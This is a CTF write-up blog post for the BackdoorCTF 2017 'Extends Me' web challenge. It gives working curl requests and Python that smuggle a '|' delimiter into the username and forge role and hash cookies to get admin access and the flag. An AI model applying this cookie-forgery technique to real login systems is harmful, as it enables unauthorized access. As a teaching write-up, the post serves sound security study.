---
layout: post
title:  "BackdoorCTF 2017 - Extends Me"
date:   2017-09-24 22:00
categories: CTF
tags: [BackdoorCTF2017]
categories: [web]
author: jbz
---

The challenge was about gaining access to a web server protected by a login. Crypto/Web 250

The server source code is available [here](https://github.com/jbzteam/CTF/blob/master/BackdoorCTF2017/server.py).

The server was using SLHA1 (a custom version of SHA1 with initial status and round constant slightly changed) to hash the `data` cookie in the following format:
`key|username|user`


`key` is a Secret constant.  
`username` is the user-provided username.  
`user` is the user's role (`user` or `admin`).  
`|` is the `|` character. *This will be useful later.*

The `user` cookie contains the user's role base64-encoded. The server check the role in the following way:
```python
if 'admin' in user: # too lazy to check properly :p
    return "Here you go : CTF{XXXXXXXXXXXXXXXXXXXXXXXXX}"
```

This approach has lots of unintended problem.

First of all, this is the *if* that checks if the data cookie is valid (and the user is authenticated). 
```python
if data != SLHA1(temp).digest():
    temp = SLHA1(temp).digest().encode('base64').strip().replace('\n','')
    # [...]
    resp.set_cookie('data',temp)
```

If the cookie isn't valid the server will take the current user information and make a new hash, making it valid for the next request. (***WAT?***)

Returning to our writeup.  
Another problem that I've immediately noticed was that the server didn't check if `username` contains the `|` character.

So I've made a first request with username `nick|admin`, the server will concatenate `key`, `nick|admin` and `user` (server's defualt role) and the cookie will be `SLHA1("key|nick|admin|user")`  

```
curl --cookie-jar - 'https://extend-me-please.herokuapp.com/login' -H 'Referer: https://extend-me-please.herokuapp.com/login' -H 'Origin: https://extend-me-please.herokuapp.com' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=nick|admin' --compressed
```

Then I've base64encoded the `admin|user` string.

```python
print("admin|user".encode('base64'))
# YWRtaW58dXNlcg==
```

Finally, a request with username set as `nick` and the user cookie set to `base64(admin|user)`.

The server will concatenate `key`, `nick` and `admin|user` and the SLHA1 hash will correspond.

```
curl --cookie-jar - 'https://extend-me-please.herokuapp.com/login' -H 'Referer: https://extend-me-please.herokuapp.com/login' -H 'Origin: https://extend-me-please.herokuapp.com' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=nick' --compressed --cookie 'user="YWRtaW58dXNlcg==";data="dwqBEszNafW8LI15fObzONQwD50zbr/Y"'
```


`Here you go : CTF{4lw4y3_u53_hm4c_f0r_4u7h}`

***Clearly***, by looking at the challange name and also at the flag, the intended solution was hash lenght extension. `¯\_(ツ)_/¯`